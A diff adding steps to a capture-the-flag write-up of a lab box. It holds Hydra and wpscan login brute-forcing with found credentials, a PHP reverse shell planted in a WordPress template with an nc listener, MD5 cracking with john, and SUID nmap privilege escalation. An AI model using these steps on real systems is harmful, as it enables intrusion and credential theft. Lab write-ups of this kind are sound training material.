@@ -69,10 +69,15 @@ Target: http://10.10.44.210/
 
 Task Completed
 ```
+- /robots.txt
+- /wp-login
 
 ## robots.txt
 
 ![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/c2a5b7b6-fc4c-4c46-b7d9-55dc34cc3ab4)
+
+- fsocity.dic
+- key-1-of-3.txt
 
 ## key 1
 
@@ -82,8 +87,106 @@ Task Completed
 
 ![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/d40f3f58-7dc7-4171-bd82-db75b4ca66f4)
 
+- to sort and filter duplicate
+```
+sort fsocity.dic | uniq > filter.txt
+```
+
 ## wp-login
 
 ![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/f7433ee8-b9d5-452c-a2f6-4b039608c1c1)
 
+## hydra [bruteforce username]
+```
+hydra -L filter.txt -p admin 10.10.191.118 http-post-form "/wp-login.php:log=^USER^&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.191.118%2Fwp-admin%2F&testcookie=1:Invalid username" -V
 
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
+[DATA] attacking http-post-form://10.10.191.118:80/wp-login.php:log=^USER^&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.191.118%2Fwp-admin%2F&testcookie=1:Invalid username
+[ATTEMPT] target 10.10.191.118 - login "000" - pass "admin" - 1 of 11452 [child 0] (0/0)
+[80][http-post-form] host: 10.10.191.118   login: elliot   password: admin
+[80][http-post-form] host: 10.10.191.118   login: Elliot   password: admin
+[80][http-post-form] host: 10.10.191.118   login: ELLIOT   password: admin
+[ATTEMPT] target 10.10.191.118 - login "Embedded" - pass "admin" - 5489 of 11452 [child 12] (0/0)
+```
+- found username: elliot, Elliot, ELLIOT
+
+## wpscan [bruteforce password]
+- using username from hydra
+```
+wpscan --url http://10.10.245.248/wp-login -U Elliot -P filter.txt    
+
+Interesting Finding(s):
+
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - Elliot / ER28-0652                                                                                             
+Trying Elliot / erased Time: 00:08:34 <==============                                > (5630 / 17081) 32.96%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: Elliot, Password: ER28-0652
+```
+- found Username: Elliot, Password: ER28-0652
+
+## successfully login
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/57d938ad-5b04-4a35-926e-5075a7da1656)
+
+## setup php reverse shell
+- goto editor => edit 404 template => replace with php reverse shell => update file
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/cc9fb496-64c0-4fc0-bf64-335f3d1182e9)
+
+## setup netcat listener
+- goto `http://10.10.191.118/wordpress/wp-content/themes/twentyfifteen/404.php` dont forget to open listener `nc -lnvp 1337` on terminal
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/b6020c84-067a-4f2b-8734-9bb82d14b0bf)
+
+- `python3 -c 'import pty;pty.spawn("/bin/bash")'` upgrade shell
+- `export TERM=xterm` enable clear
+
+## cd /home/robot
+- `cat password.raw-md5` `robot:c3fcd3d76192e4007dfb496cca67e13b`
+- `cat key-2-of-3.txt` `Permission denied`
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/bb3fb870-6da9-4d78-b614-31155ac89681)
+
+
+## crack md5 hash
+```
+john --format=Raw-MD5 --wordlist=/home/kali/Desktop/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefghijklmnopqrstuvwxyz (?)     
+1g 0:00:00:00 DONE (2023-08-02 12:12) 5.263g/s 213221p/s 213221c/s 213221C/s bonjour1..123092
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+- found password: abcdefghijklmnopqrstuvwxyz
+
+## switch user to robot
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/ce39eb3b-2a3d-4efa-b7b3-9ec1ec630974)
+
+## key 2
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/8ded0f0d-6d7d-46dc-ade5-c1fe5d1a92fc)
+
+## privilege escalation
+- using SUID Commands `find / -user root -perm /4000 2>/dev/null`
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/74d1126b-baf4-4607-86d9-d01986e855c3)
+
+- Search GTFObins for [nmap](https://gtfobins.github.io/gtfobins/nmap/) because it looks sus here.
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/45e99a78-295b-4192-9b94-9c33460b5800)
+
+- root!
+
+## key 3
+
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/b26a09eb-3d7f-4402-a63f-1bf3bf9b0089)
+
+- PWNED! :star:
